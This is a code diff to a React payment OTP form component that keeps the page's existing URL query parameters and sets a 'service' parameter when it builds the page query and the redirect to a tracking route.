@@ -15,6 +15,7 @@ const PaymentOTPForm = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData, isLoading } = useLink(id);
+  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -53,7 +54,14 @@ const PaymentOTPForm = () => {
   const branding = getServiceBranding(serviceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+  const serviceQuery = useMemo(() => {
+    const params = new URLSearchParams(initialSearch || "");
+    if (serviceKey) {
+      params.set('service', serviceKey);
+    }
+    const search = params.toString();
+    return search ? `?${search}` : "";
+  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
@@ -69,11 +77,16 @@ const PaymentOTPForm = () => {
     const sessionService = sessionStorage.getItem('serviceKey');
     const payloadService = linkData?.payload?.service_key || linkData?.payload?.service;
     const serviceKeyParam = payloadService || urlServiceKey || customerInfo.serviceKey || sessionService;
-    const serviceQuery = serviceKeyParam ? `?service=${encodeURIComponent(serviceKeyParam)}` : "";
-    if (!method) {
-      navigate(`/pay/${id}/track${serviceQuery}`);
+    const params = new URLSearchParams(initialSearch || "");
+    if (serviceKeyParam) {
+      params.set('service', serviceKeyParam);
     }
-  }, [id, navigate, linkData, urlServiceKey, customerInfo.serviceKey]);
+    const search = params.toString();
+    const effectiveQuery = search ? `?${search}` : "";
+    if (!method) {
+      navigate(`/pay/${id}/track${effectiveQuery}`);
+    }
+  }, [id, navigate, linkData, urlServiceKey, customerInfo.serviceKey, initialSearch]);
 
   // Countdown timer effect
   useEffect(() => {
